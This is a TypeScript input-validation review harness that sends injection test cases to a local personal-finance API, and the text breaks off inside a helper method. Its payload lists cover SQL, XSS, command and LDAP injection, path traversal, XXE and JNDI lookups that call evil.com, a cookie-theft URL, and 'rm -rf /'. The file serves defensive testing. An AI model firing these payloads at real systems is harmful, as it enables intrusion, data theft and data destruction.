/**
 * T452: Input Validation and Sanitization Review
 *
 * Comprehensive input validation and sanitization review framework that tests
 * all input vectors, validates sanitization mechanisms, and identifies injection
 * vulnerabilities across the application.
 */

import axios, { AxiosInstance } from 'axios';
import validator from 'validator';
import DOMPurify from 'isomorphic-dompurify';

interface ValidationTestCase {
  field: string;
  endpoint: string;
  method: string;
  payload: any;
  expectedResult: 'ACCEPT' | 'REJECT' | 'SANITIZE';
  category: string;
  description: string;
}

interface ValidationVulnerability {
  endpoint: string;
  method: string;
  field: string;
  vulnerability: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO';
  description: string;
  payload: any;
  actualResult: any;
  expectedResult: any;
  recommendation: string;
  cwe?: string;
}

interface ValidationTestResult {
  totalTests: number;
  passed: number;
  failed: number;
  vulnerabilities: ValidationVulnerability[];
  categories: {
    sqlInjection: number;
    xss: number;
    commandInjection: number;
    pathTraversal: number;
    ldapInjection: number;
    xmlInjection: number;
    businessLogic: number;
    dataType: number;
    length: number;
    format: number;
  };
  overallSecurity: 'SECURE' | 'VULNERABLE' | 'CRITICAL';
}

class InputValidationReviewer {
  private apiClient: AxiosInstance;
  private baseUrl: string;
  private vulnerabilities: ValidationVulnerability[] = [];
  private testCases: ValidationTestCase[] = [];

  constructor(baseUrl: string = 'http://localhost:3000') {
    this.baseUrl = baseUrl;
    this.apiClient = axios.create({
      baseURL: baseUrl,
      timeout: 15000,
      validateStatus: () => true
    });

    this.generateTestCases();
  }

  /**
   * Run comprehensive input validation review
   */
  async runInputValidationReview(): Promise<ValidationTestResult> {
    console.log('🔍 Starting comprehensive input validation and sanitization review...');
    console.log(`🎯 Target: ${this.baseUrl}`);

    this.vulnerabilities = [];

    try {
      // Test all generated test cases
      await this.executeTestCases();

      // Specific validation tests
      await this.testEmailValidation();
      await this.testPasswordValidation();
      await this.testFinancialDataValidation();
      await this.testDateTimeValidation();
      await this.testFileUploadValidation();
      await this.testJSONValidation();
      await this.testURLValidation();

      return this.generateTestResult();

    } catch (error) {
      this.addVulnerability({
        endpoint: 'GENERAL',
        method: 'TEST',
        field: 'VALIDATION_FRAMEWORK',
        vulnerability: 'INPUT_VALIDATION_TEST_ERROR',
        severity: 'CRITICAL',
        description: `Input validation testing failed: ${error.message}`,
        payload: null,
        actualResult: error.message,
        expectedResult: 'Successful test execution',
        recommendation: 'Fix testing infrastructure and re-run input validation review'
      });

      return this.generateTestResult();
    }
  }

  /**
   * Generate comprehensive test cases
   */
  private generateTestCases(): void {
    console.log('📋 Generating comprehensive test cases...');

    // Authentication endpoints
    this.addAuthenticationTestCases();

    // Family management endpoints
    this.addFamilyTestCases();

    // Income management endpoints
    this.addIncomeTestCases();

    // Payment management endpoints
    this.addPaymentTestCases();

    // Bank integration endpoints
    this.addBankTestCases();

    // Budget management endpoints
    this.addBudgetTestCases();

    // Reports endpoints
    this.addReportsTestCases();

    console.log(`Generated ${this.testCases.length} test cases`);
  }

  /**
   * Add authentication test cases
   */
  private addAuthenticationTestCases(): void {
    const sqlPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "admin'--",
      "' UNION SELECT * FROM users WHERE '1'='1",
      "'; UPDATE users SET password='hacked' WHERE email='admin@example.com'; --"
    ];

    const xssPayloads = [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')",
      "<svg onload=alert('XSS')>",
      "'\"><script>alert('XSS')</script>"
    ];

    // Registration endpoint tests
    for (const payload of sqlPayloads) {
      this.testCases.push({
        field: 'email',
        endpoint: '/api/auth/register',
        method: 'POST',
        payload: { email: payload, password: 'Password123!', name: 'Test User' },
        expectedResult: 'REJECT',
        category: 'SQL_INJECTION',
        description: `SQL injection in registration email field: ${payload}`
      });
    }

    for (const payload of xssPayloads) {
      this.testCases.push({
        field: 'name',
        endpoint: '/api/auth/register',
        method: 'POST',
        payload: { email: 'test@example.com', password: 'Password123!', name: payload },
        expectedResult: 'SANITIZE',
        category: 'XSS',
        description: `XSS in registration name field: ${payload}`
      });
    }

    // Login endpoint tests
    for (const payload of sqlPayloads) {
      this.testCases.push({
        field: 'email',
        endpoint: '/api/auth/login',
        method: 'POST',
        payload: { email: payload, password: 'password' },
        expectedResult: 'REJECT',
        category: 'SQL_INJECTION',
        description: `SQL injection in login email field: ${payload}`
      });
    }

    // Password validation tests
    const weakPasswords = [
      'password',
      '123456',
      'admin',
      '12345678',
      'password123',
      'PASSWORD',
      'Password',
      'Pass123',
      '',
      ' ',
      null,
      undefined
    ];

    for (const password of weakPasswords) {
      this.testCases.push({
        field: 'password',
        endpoint: '/api/auth/register',
        method: 'POST',
        payload: { email: 'test@example.com', password, name: 'Test User' },
        expectedResult: 'REJECT',
        category: 'BUSINESS_LOGIC',
        description: `Weak password validation: ${password}`
      });
    }
  }

  /**
   * Add family management test cases
   */
  private addFamilyTestCases(): void {
    const maliciousNames = [
      "<script>alert('XSS')</script>",
      "'; DROP TABLE families; --",
      "../../../etc/passwd",
      "${7*7}",
      "{{7*7}}",
      "<%=7*7%>",
      "${java:os}",
      "${jndi:ldap://evil.com/x}"
    ];

    for (const name of maliciousNames) {
      this.testCases.push({
        field: 'name',
        endpoint: '/api/families',
        method: 'PUT',
        payload: { name, description: 'Family description' },
        expectedResult: 'SANITIZE',
        category: name.includes('DROP') ? 'SQL_INJECTION' : name.includes('script') ? 'XSS' : 'INJECTION',
        description: `Malicious family name: ${name}`
      });
    }

    // Test excessive lengths
    const longString = 'A'.repeat(10000);
    this.testCases.push({
      field: 'name',
      endpoint: '/api/families',
      method: 'PUT',
      payload: { name: longString },
      expectedResult: 'REJECT',
      category: 'LENGTH_VALIDATION',
      description: 'Excessive length family name'
    });
  }

  /**
   * Add income management test cases
   */
  private addIncomeTestCases(): void {
    // Test negative amounts
    this.testCases.push({
      field: 'amount',
      endpoint: '/api/income-events',
      method: 'POST',
      payload: { amount: -1000, description: 'Test income', category: 'salary' },
      expectedResult: 'REJECT',
      category: 'BUSINESS_LOGIC',
      description: 'Negative income amount'
    });

    // Test extreme amounts
    this.testCases.push({
      field: 'amount',
      endpoint: '/api/income-events',
      method: 'POST',
      payload: { amount: Number.MAX_SAFE_INTEGER, description: 'Test income', category: 'salary' },
      expectedResult: 'REJECT',
      category: 'BUSINESS_LOGIC',
      description: 'Extreme income amount'
    });

    // Test invalid data types
    const invalidAmounts = [
      'not-a-number',
      '${7*7}',
      '<script>alert(1)</script>',
      null,
      undefined,
      {},
      [],
      Infinity,
      -Infinity,
      NaN
    ];

    for (const amount of invalidAmounts) {
      this.testCases.push({
        field: 'amount',
        endpoint: '/api/income-events',
        method: 'POST',
        payload: { amount, description: 'Test income', category: 'salary' },
        expectedResult: 'REJECT',
        category: 'DATA_TYPE',
        description: `Invalid amount data type: ${typeof amount} - ${amount}`
      });
    }

    // Test description XSS
    const xssDescriptions = [
      "<script>fetch('/api/auth/me').then(r=>r.json()).then(d=>alert(JSON.stringify(d)))</script>",
      "<img src=x onerror=fetch('/api/families').then(r=>r.text()).then(d=>document.body.innerHTML=d)>",
      "javascript:void(fetch('/api/payments').then(r=>r.json()).then(d=>console.log(d)))"
    ];

    for (const description of xssDescriptions) {
      this.testCases.push({
        field: 'description',
        endpoint: '/api/income-events',
        method: 'POST',
        payload: { amount: 1000, description, category: 'salary' },
        expectedResult: 'SANITIZE',
        category: 'XSS',
        description: `XSS in income description: ${description.substring(0, 50)}...`
      });
    }
  }

  /**
   * Add payment management test cases
   */
  private addPaymentTestCases(): void {
    // Command injection in payment descriptions
    const commandPayloads = [
      '; cat /etc/passwd',
      '&& whoami',
      '| ls -la',
      '`id`',
      '$(whoami)',
      '; ping -c 1 127.0.0.1',
      '& net user',
      '|| dir'
    ];

    for (const payload of commandPayloads) {
      this.testCases.push({
        field: 'description',
        endpoint: '/api/payments',
        method: 'POST',
        payload: {
          amount: 100,
          description: `Payment description ${payload}`,
          category: 'utilities',
          dueDate: '2024-12-31'
        },
        expectedResult: 'SANITIZE',
        category: 'COMMAND_INJECTION',
        description: `Command injection in payment description: ${payload}`
      });
    }

    // Path traversal in category
    const pathPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
    ];

    for (const payload of pathPayloads) {
      this.testCases.push({
        field: 'category',
        endpoint: '/api/payments',
        method: 'POST',
        payload: {
          amount: 100,
          description: 'Test payment',
          category: payload,
          dueDate: '2024-12-31'
        },
        expectedResult: 'REJECT',
        category: 'PATH_TRAVERSAL',
        description: `Path traversal in payment category: ${payload}`
      });
    }

    // Invalid date formats
    const invalidDates = [
      '2024-13-01', // Invalid month
      '2024-02-30', // Invalid day
      'not-a-date',
      '${new Date()}',
      '<script>new Date()</script>',
      '../../2024/12/31',
      null,
      undefined,
      123456789,
      {}
    ];

    for (const date of invalidDates) {
      this.testCases.push({
        field: 'dueDate',
        endpoint: '/api/payments',
        method: 'POST',
        payload: {
          amount: 100,
          description: 'Test payment',
          category: 'utilities',
          dueDate: date
        },
        expectedResult: 'REJECT',
        category: 'FORMAT_VALIDATION',
        description: `Invalid date format: ${date}`
      });
    }
  }

  /**
   * Add bank integration test cases
   */
  private addBankTestCases(): void {
    // Test Plaid webhook validation
    const maliciousWebhooks = [
      { webhook_type: '"; DROP TABLE transactions; --' },
      { webhook_type: '<script>alert("XSS")</script>' },
      { webhook_type: '${7*7}' },
      { webhook_type: '../../../etc/passwd' },
      { webhook_code: 'SYNC_UPDATES_AVAILABLE; rm -rf /' },
      { item_id: 'item_123<script>alert(1)</script>' },
      { account_id: '../../admin/accounts' }
    ];

    for (const webhook of maliciousWebhooks) {
      this.testCases.push({
        field: Object.keys(webhook)[0],
        endpoint: '/api/plaid/webhook',
        method: 'POST',
        payload: webhook,
        expectedResult: 'REJECT',
        category: webhook[Object.keys(webhook)[0]].includes('DROP') ? 'SQL_INJECTION' :
                  webhook[Object.keys(webhook)[0]].includes('script') ? 'XSS' :
                  webhook[Object.keys(webhook)[0]].includes('/') ? 'PATH_TRAVERSAL' : 'INJECTION',
        description: `Malicious webhook ${Object.keys(webhook)[0]}: ${webhook[Object.keys(webhook)[0]]}`
      });
    }

    // Test account connection data
    const maliciousAccountData = [
      { name: "<script>window.location='http://evil.com'</script>" },
      { name: "'; UPDATE accounts SET balance=999999 WHERE id=1; --" },
      { type: '../../../admin/accounts' },
      { mask: '${java:os}' }
    ];

    for (const accountData of maliciousAccountData) {
      this.testCases.push({
        field: Object.keys(accountData)[0],
        endpoint: '/api/bank-accounts',
        method: 'POST',
        payload: accountData,
        expectedResult: 'SANITIZE',
        category: accountData[Object.keys(accountData)[0]].includes('DROP') ? 'SQL_INJECTION' :
                  accountData[Object.keys(accountData)[0]].includes('script') ? 'XSS' : 'INJECTION',
        description: `Malicious account ${Object.keys(accountData)[0]}: ${accountData[Object.keys(accountData)[0]]}`
      });
    }
  }

  /**
   * Add budget management test cases
   */
  private addBudgetTestCases(): void {
    // Test invalid percentages
    const invalidPercentages = [
      -50,   // Negative
      150,   // Over 100%
      999,   // Way over 100%
      -999,  // Very negative
      0.001, // Too precise
      '50%', // String with %
      'fifty', // Non-numeric
      null,
      undefined,
      NaN,
      Infinity,
      -Infinity
    ];

    for (const percentage of invalidPercentages) {
      this.testCases.push({
        field: 'percentage',
        endpoint: '/api/budget-categories',
        method: 'POST',
        payload: {
          name: 'Test Category',
          percentage,
          description: 'Test budget category'
        },
        expectedResult: 'REJECT',
        category: 'BUSINESS_LOGIC',
        description: `Invalid budget percentage: ${percentage}`
      });
    }

    // Test LDAP injection in category names
    const ldapPayloads = [
      '*)(uid=*',
      '*)(|(password=*))',
      '*)(&(uid=admin)(password=*))',
      '*))%00',
      '*)|(cn=*'
    ];

    for (const payload of ldapPayloads) {
      this.testCases.push({
        field: 'name',
        endpoint: '/api/budget-categories',
        method: 'POST',
        payload: {
          name: payload,
          percentage: 25,
          description: 'Test budget category'
        },
        expectedResult: 'SANITIZE',
        category: 'LDAP_INJECTION',
        description: `LDAP injection in budget category name: ${payload}`
      });
    }
  }

  /**
   * Add reports test cases
   */
  private addReportsTestCases(): void {
    // Test report export filename injection
    const filenamePayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\SAM',
      'report.pdf; cat /etc/passwd',
      'report$(whoami).pdf',
      'report`id`.pdf',
      'report|ls -la.pdf',
      'report<script>alert(1)</script>.pdf',
      'CON', 'PRN', 'AUX', 'NUL', // Windows reserved names
      'report\x00.pdf' // Null byte injection
    ];

    for (const filename of filenamePayloads) {
      this.testCases.push({
        field: 'filename',
        endpoint: '/api/reports/export',
        method: 'POST',
        payload: {
          reportType: 'cash-flow',
          format: 'pdf',
          filename
        },
        expectedResult: 'REJECT',
        category: filename.includes('/') || filename.includes('\\') ? 'PATH_TRAVERSAL' :
                  filename.includes('cat') || filename.includes('whoami') ? 'COMMAND_INJECTION' :
                  filename.includes('script') ? 'XSS' : 'INJECTION',
        description: `Malicious report filename: ${filename}`
      });
    }

    // Test XML injection in custom reports
    const xmlPayloads = [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><root>&xxe;</root>',
      '<!--#exec cmd="/bin/cat /etc/passwd" -->',
      '<![CDATA[<script>alert("XSS")</script>]]>'
    ];

    for (const payload of xmlPayloads) {
      this.testCases.push({
        field: 'query',
        endpoint: '/api/reports/custom',
        method: 'POST',
        payload: {
          name: 'Custom Report',
          query: payload,
          format: 'xml'
        },
        expectedResult: 'REJECT',
        category: 'XML_INJECTION',
        description: `XML injection in custom report: ${payload.substring(0, 50)}...`
      });
    }
  }

  /**
   * Execute all test cases
   */
  private async executeTestCases(): Promise<void> {
    console.log(`🧪 Executing ${this.testCases.length} test cases...`);

    for (let i = 0; i < this.testCases.length; i++) {
      const testCase = this.testCases[i];

      try {
        const response = await this.makeRequest(testCase.method, testCase.endpoint, testCase.payload);

        // Analyze response based on expected result
        this.analyzeTestCaseResult(testCase, response);

        // Small delay to avoid overwhelming the server
        if (i % 10 === 0) {
          await this.sleep(200);
        }

      } catch (error) {
        // Network errors or server errors
        if (testCase.expectedResult === 'REJECT' && (error.code === 'ECONNREFUSED' || error.response?.status >= 500)) {
          // This might be acceptable - server rejected the request
          continue;
        }

        this.addVulnerability({
          endpoint: testCase.endpoint,
          method: testCase.method,
          field: testCase.field,
          vulnerability: 'TEST_EXECUTION_ERROR',
          severity: 'LOW',
          description: `Failed to execute test case: ${error.message}`,
          payload: testCase.payload,
          actualResult: error.message,
          expectedResult: testCase.expectedResult,
          recommendation: 'Investigate endpoint availability for testing'
        });
      }
    }
  }

  /**
   * Analyze test case result
   */
  private analyzeTestCaseResult(testCase: ValidationTestCase, response: any): void {
    const { status, data } = response;

    switch (testCase.expectedResult) {
      case 'REJECT':
        if (status >= 400) {
          // Good - request was rejected
          return;
        }
        // Vulnerability - malicious input was accepted
        this.addVulnerability({
          endpoint: testCase.endpoint,
          method: testCase.method,
          field: testCase.field,
          vulnerability: `${testCase.category}_NOT_BLOCKED`,
          severity: this.getSeverityForCategory(testCase.category),
          description: `${testCase.description} - malicious input was accepted`,
          payload: testCase.payload,
          actualResult: { status, data: data ? JSON.stringify(data).substring(0, 200) : null },
          expectedResult: 'HTTP 400-499 error',
          recommendation: this.getRecommendationForCategory(testCase.category),
          cwe: this.getCWEForCategory(testCase.category)
        });
        break;

      case 'SANITIZE':
        if (status < 400 && data) {
          // Check if dangerous content was sanitized
          const responseText = JSON.stringify(data);
          const payloadText = JSON.stringify(testCase.payload);

          if (responseText.includes('<script>') || responseText.includes('javascript:') ||
              responseText.includes('DROP TABLE') || responseText.includes('UNION SELECT')) {
            // Vulnerability - dangerous content not sanitized
            this.addVulnerability({
              endpoint: testCase.endpoint,
              method: testCase.method,
              field: testCase.field,
              vulnerability: `${testCase.category}_NOT_SANITIZED`,
              severity: this.getSeverityForCategory(testCase.category),
              description: `${testCase.description} - dangerous content not sanitized`,
              payload: testCase.payload,
              actualResult: { status, unsanitizedContent: responseText.substring(0, 200) },
              expectedResult: 'Sanitized content without dangerous elements',
              recommendation: this.getRecommendationForCategory(testCase.category),
              cwe: this.getCWEForCategory(testCase.category)
            });
          }
        }
        break;

      case 'ACCEPT':
        if (status >= 400) {
          // Potential issue - legitimate input was rejected
          this.addVulnerability({
            endpoint: testCase.endpoint,
            method: testCase.method,
            field: testCase.field,
            vulnerability: 'LEGITIMATE_INPUT_REJECTED',
            severity: 'LOW',
            description: `${testCase.description} - legitimate input was rejected`,
            payload: testCase.payload,
            actualResult: { status, error: data },
            expectedResult: 'HTTP 200-299 success',
            recommendation: 'Review validation rules to ensure legitimate input is accepted'
          });
        }
        break;
    }
  }

  /**
   * Test email validation
   */
  private async testEmailValidation(): Promise<void> {
    console.log('📧 Testing email validation...');

    const validEmails = [
      'user@example.com',
      'test.email+tag@example.co.uk',
      'user123@test-domain.com',
      'firstname.lastname@domain.com'
    ];

    const invalidEmails = [
      'not-an-email',
      '@example.com',
      'user@',
      'user@.com',
      'user..double.dot@example.com',
      'user@domain',
      '<script>alert(1)</script>@evil.com',
      'user@domain.com; DROP TABLE users; --',
      'user@${7*7}.com',
      ''
    ];

    // Test valid emails (should be accepted)
    for (const email of validEmails) {
      try {
        const response = await this.makeRequest('POST', '/api/auth/register', {
          email,
          password: 'ValidPassword123!',
          name: 'Test User'
        });

        if (response.status >= 400 && response.data?.message?.toLowerCase().includes('email')) {
          this.addVulnerability({
            endpoint: '/api/auth/register',
            method: 'POST',
            field: 'email',
            vulnerability: 'VALID_EMAIL_REJECTED',
            severity: 'LOW',
            description: `Valid email rejected: ${email}`,
            payload: { email },
            actualResult: response.data?.message,
            expectedResult: 'Email should be accepted',
            recommendation: 'Review email validation regex to ensure valid emails are accepted'
          });
        }
      } catch (error) {
        // Expected for some test cases
      }
    }

    // Test invalid emails (should be rejected)
    for (const email of invalidEmails) {
      try {
        const response = await this.makeRequest('POST', '/api/auth/register', {
          email,
          password: 'ValidPassword123!',
          name: 'Test User'
        });

        if (response.status < 400) {
          this.addVulnerability({
            endpoint: '/api/auth/register',
            method: 'POST',
            field: 'email',
            vulnerability: 'INVALID_EMAIL_ACCEPTED',
            severity: email.includes('script') || email.includes('DROP') ? 'HIGH' : 'MEDIUM',
            description: `Invalid email accepted: ${email}`,
            payload: { email },
            actualResult: 'Email was accepted',
            expectedResult: 'Email should be rejected',
            recommendation: 'Implement proper email validation using proven regex patterns or validation libraries',
            cwe: email.includes('script') ? 'CWE-79' : email.includes('DROP') ? 'CWE-89' : 'CWE-20'
          });
        }
      } catch (error) {
        // Expected for malicious payloads
      }
    }
  }

  /**
   * Test password validation
   */
  private async testPasswordValidation(): Promise<void> {
    console.log('🔐 Testing password validation...');

    const strongPasswords = [
      'StrongP@ssw0rd!',
      'MySecure123!Password',
      'Complex1ty#Required',
      'V3ryStr0ng&S3cur3!'
    ];

    const weakPasswords = [
      'password',
      '123456',
      'password123',
      'PASSWORD',
      'Password',
      'pass',
      '',
      'a',
      '12345678',
      'admin'
    ];

    // Test strong passwords (should be accepted)
    for (const password of strongPasswords) {
      try {
        const response = await this.makeRequest('POST', '/api/auth/register', {
          email: 'test@example.com',
          password,
          name: 'Test User'
        });

        if (response.status >= 400 && response.data?.message?.toLowerCase().includes('password')) {
          this.addVulnerability({
            endpoint: '/api/auth/register',
            method: 'POST',
            field: 'password',
            vulnerability: 'STRONG_PASSWORD_REJECTED',
            severity: 'LOW',
            description: `Strong password rejected: ${password}`,
            payload: { password: '***' },
            actualResult: response.data?.message,
            expectedResult: 'Strong password should be accepted',
            recommendation: 'Review password validation rules to ensure strong passwords are accepted'
          });
        }
      } catch (error) {
        // Expected for some cases
      }
    }

    // Test weak passwords (should be rejected)
    for (const password of weakPasswords) {
      try {
        const response = await this.makeRequest('POST', '/api/auth/register', {
          email: 'test@example.com',
          password,
          name: 'Test User'
        });

        if (response.status < 400) {
          this.addVulnerability({
            endpoint: '/api/auth/register',
            method: 'POST',
            field: 'password',
            vulnerability: 'WEAK_PASSWORD_ACCEPTED',
            severity: 'HIGH',
            description: `Weak password accepted: ${password}`,
            payload: { password: '***' },
            actualResult: 'Weak password was accepted',
            expectedResult: 'Weak password should be rejected',
            recommendation: 'Implement strong password policy (minimum 8 chars, uppercase, lowercase, numbers, special chars)',
            cwe: 'CWE-521'
          });
        }
      } catch (error) {
        // Expected
      }
    }
  }

  /**
   * Test financial data validation
   */
  private async testFinancialDataValidation(): Promise<void> {
    console.log('💰 Testing financial data validation...');

    const validAmounts = [
      100.00,
      0.01,
      999999.99,
      1500.50
    ];

    const invalidAmounts = [
      -100,      // Negative
      0,         // Zero
      0.001,     // Too many decimals
      999999999999, // Too large
      'not-a-number',
      null,
      undefined,
      NaN,
      Infinity,
      -Infinity
    ];

    const endpoints = [
      '/api/income-events',
      '/api/payments'
    ];

    for (const endpoint of endpoints) {
      // Test valid amounts (should be accepted)
      for (const amount of validAmounts) {
        try {
          const response = await this.makeRequest('POST', endpoint, {
            amount,
            description: 'Test transaction',
            category: 'test'
          });

          if (response.status >= 400 && response.data?.message?.toLowerCase().includes('amount')) {
            this.addVulnerability({
              endpoint,
              method: 'POST',
              field: 'amount',
              vulnerability: 'VALID_AMOUNT_REJECTED',
              severity: 'LOW',
              description: `Valid amount rejected: ${amount}`,
              payload: { amount },
              actualResult: response.data?.message,
              expectedResult: 'Valid amount should be accepted',
              recommendation: 'Review amount validation rules'
            });
          }
        } catch (error) {
          // Expected for some cases
        }
      }

      // Test invalid amounts (should be rejected)
      for (const amount of invalidAmounts) {
        try {
          const response = await this.makeRequest('POST', endpoint, {
            amount,
            description: 'Test transaction',
            category: 'test'
          });

          if (response.status < 400) {
            this.addVulnerability({
              endpoint,
              method: 'POST',
              field: 'amount',
              vulnerability: 'INVALID_AMOUNT_ACCEPTED',
              severity: 'HIGH',
              description: `Invalid amount accepted: ${amount}`,
              payload: { amount },
              actualResult: 'Invalid amount was accepted',
              expectedResult: 'Invalid amount should be rejected',
              recommendation: 'Implement proper financial amount validation (positive numbers, reasonable precision)',
              cwe: 'CWE-20'
            });
          }
        } catch (error) {
          // Expected for malicious payloads
        }
      }
    }
  }

  /**
   * Test date/time validation
   */
  private async testDateTimeValidation(): Promise<void> {
    console.log('📅 Testing date/time validation...');

    const validDates = [
      '2024-12-31',
      '2025-01-01',
      '2024-02-29', // Leap year
      '2023-12-25'
    ];

    const invalidDates = [
      '2024-13-01',  // Invalid month
      '2024-02-30',  // Invalid day
      '2023-02-29',  // Not a leap year
      'not-a-date',
      '32/13/2024',
      '2024/13/32',
      '<script>alert(1)</script>',
      '../../2024/12/31',
      null,
      undefined,
      123456789
    ];

    // Test valid dates (should be accepted)
    for (const date of validDates) {
      try {
        const response = await this.makeRequest('POST', '/api/payments', {
          amount: 100,
          description: 'Test payment',
          category: 'utilities',
          dueDate: date
        });

        if (response.status >= 400 && response.data?.message?.toLowerCase().includes('date')) {
          this.addVulnerability({
            endpoint: '/api/payments',
            method: 'POST',
            field: 'dueDate',
            vulnerability: 'VALID_DATE_REJECTED',
            severity: 'LOW',
            description: `Valid date rejected: ${date}`,
            payload: { dueDate: date },
            actualResult: response.data?.message,
            expectedResult: 'Valid date should be accepted',
            recommendation: 'Review date validation rules'
          });
        }
      } catch (error) {
        // Expected for some cases
      }
    }

    // Test invalid dates (should be rejected)
    for (const date of invalidDates) {
      try {
        const response = await this.makeRequest('POST', '/api/payments', {
          amount: 100,
          description: 'Test payment',
          category: 'utilities',
          dueDate: date
        });

        if (response.status < 400) {
          this.addVulnerability({
            endpoint: '/api/payments',
            method: 'POST',
            field: 'dueDate',
            vulnerability: 'INVALID_DATE_ACCEPTED',
            severity: date && date.toString().includes('script') ? 'HIGH' : 'MEDIUM',
            description: `Invalid date accepted: ${date}`,
            payload: { dueDate: date },
            actualResult: 'Invalid date was accepted',
            expectedResult: 'Invalid date should be rejected',
            recommendation: 'Implement proper date validation using Date parsing with validation',
            cwe: date && date.toString().includes('script') ? 'CWE-79' : 'CWE-20'
          });
        }
      } catch (error) {
        // Expected for malicious payloads
      }
    }
  }

  /**
   * Test file upload validation
   */
  private async testFileUploadValidation(): Promise<void> {
    console.log('📁 Testing file upload validation...');

    const maliciousFilenames = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\SAM',
      'file.exe',
      'script.js',
      'malware.bat',
      'virus.com',
      'file.php',
      'shell.jsp',
      'backdoor.asp',
      'file\x00.txt', // Null byte injection
      'CON', 'PRN', 'AUX', 'NUL' // Windows reserved names
    ];

    for (const filename of maliciousFilenames) {
      try {
        // Simulate file upload (endpoint may not exist, but we test the filename)
        const response = await this.makeRequest('POST', '/api/files/upload', {
          filename,
          content: 'test file content',
          type: 'text/plain'
        });

        if (response.status < 400) {
          this.addVulnerability({
            endpoint: '/api/files/upload',
            method: 'POST',
            field: 'filename',
            vulnerability: 'MALICIOUS_FILENAME_ACCEPTED',
            severity: filename.includes('exe') || filename.includes('bat') ? 'CRITICAL' : 'HIGH',
            description: `Malicious filename accepted: ${filename}`,
            payload: { filename },
            actualResult: 'Malicious filename was accepted',
            expectedResult: 'Malicious filename should be rejected',
            recommendation: 'Implement proper filename validation and sanitization',
            cwe: filename.includes('/') || filename.includes('\\') ? 'CWE-22' : 'CWE-434'
          });
        }
      } catch (error) {
        // Expected - endpoint may not exist or reject malicious files
      }
    }
  }

  /**
   * Test JSON validation
   */
  private async testJSONValidation(): Promise<void> {
    console.log('📄 Testing JSON validation...');

    const maliciousJSONStrings = [
      '{"key": "<script>alert(1)</script>"}',
      '{"query": "SELECT * FROM users WHERE id = 1; DROP TABLE users; --"}',
      '{"command": "cat /etc/passwd"}',
      '{"path": "../../../etc/passwd"}',
      '{"eval": "${7*7}"}',
      '{"template": "{{7*7}}"}',
      '{"jsx": "<%=7*7%>"}',
      'INVALID_JSON{',
      '{"circular": {"self": true}}',
      '{"huge": "' + 'A'.repeat(1000000) + '"}' // Large payload
    ];

    for (const jsonString of maliciousJSONStrings) {
      try {
        // Test with various endpoints that accept JSON
        const endpoints = ['/api/families', '/api/reports/custom'];

        for (const endpoint of endpoints) {
          try {
            let payload;
            try {
              payload = JSON.parse(jsonString);
            } catch (e) {
              // Send malformed JSON as string
              payload = jsonString;
            }

            const response = await this.makeRequest('POST', endpoint, payload);

            if (response.status < 400 && response.data) {
              const responseText = JSON.stringify(response.data);

              // Check if dangerous content persisted
              if (responseText.includes('<script>') || responseText.includes('DROP TABLE') ||
                  responseText.includes('cat /etc/passwd') || responseText.includes('${7*7}')) {
                this.addVulnerability({
                  endpoint,
                  method: 'POST',
                  field: 'json_payload',
                  vulnerability: 'MALICIOUS_JSON_ACCEPTED',
                  severity: 'HIGH',
                  description: `Malicious JSON content accepted and reflected: ${jsonString.substring(0, 50)}...`,
                  payload: payload,
                  actualResult: responseText.substring(0, 200),
                  expectedResult: 'Malicious JSON should be rejected or sanitized',
                  recommendation: 'Implement proper JSON validation and sanitization',
                  cwe: responseText.includes('script') ? 'CWE-79' : 'CWE-20'
                });
              }
            }
          } catch (error) {
            // Expected for malicious payloads
          }
        }
      } catch (error) {
        // Expected for malformed JSON
      }
    }
  }

  /**
   * Test URL validation
   */
  private async testURLValidation(): Promise<void> {
    console.log('🌐 Testing URL validation...');

    const maliciousURLs = [
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'file:///etc/passwd',
      'ftp://evil.com/malware.exe',
      'http://evil.com/steal-cookies?cookie=' + encodeURIComponent('document.cookie'),
      'https://phishing-site.com/login',
      '../../../admin/panel',
      'http://localhost:22/ssh-tunnel',
      'gopher://internal-service:8080/',
      'ldap://internal-ldap:389/dc=company,dc=com'
    ];

    const validURLs = [
      'https://example.com',
      'https://www.google.com',
      'https://api.example.com/endpoint',
      'http://localhost:3000/test' // For development
    ];

    // Test malicious URLs (should be rejected)
    for (const url of maliciousURLs) {
      try {
        // Test in contexts where URLs might be accepted
        const response = await this.makeRequest('POST', '/api/settings/webhook', {
          url,
          events: ['transaction.created']
        });

        if (response.status < 400) {
          this.addVulnerability({
            endpoint: '/api/settings/webhook',
            method: 'POST',
            field: 'url',
            vulnerability: 'MALICIOUS_URL_ACCEPTED',
            severity: url.includes('javascript:') || url.includes('data:') ? 'CRITICAL' : 'HIGH',
            description: `Malicious URL accepted: ${url}`,
            payload: { url },
            actualResult: 'Malicious URL was accepted',
            expectedResult: 'Malicious URL should be rejected',
            recommendation: 'Implement URL validation with protocol whitelist and domain validation',
            cwe: 'CWE-20'
          });
        }
      } catch (error) {
        // Expected - endpoint may not exist or reject malicious URLs
      }
    }
  }

  /**
   * Helper methods
   */
  private getSeverityForCategory(category: string): 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO' {
    const severityMap: Record<string, 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW' | 'INFO'> = {
      'SQL_INJECTION': 'CRITICAL',
      'COMMAND_INJECTION': 'CRITICAL',
      'XML_INJECTION': 'HIGH',
      'XSS': 'HIGH',
      'PATH_TRAVERSAL': 'HIGH',
      'LDAP_INJECTION': 'HIGH',
      'BUSINESS_LOGIC': 'MEDIUM',
      'DATA_TYPE': 'MEDIUM',
      'FORMAT_VALIDATION': 'MEDIUM',
      'LENGTH_VALIDATION': 'LOW',
      'INJECTION': 'MEDIUM'
    };

    return severityMap[category] || 'MEDIUM';
  }

  private getRecommendationForCategory(category: string): string {
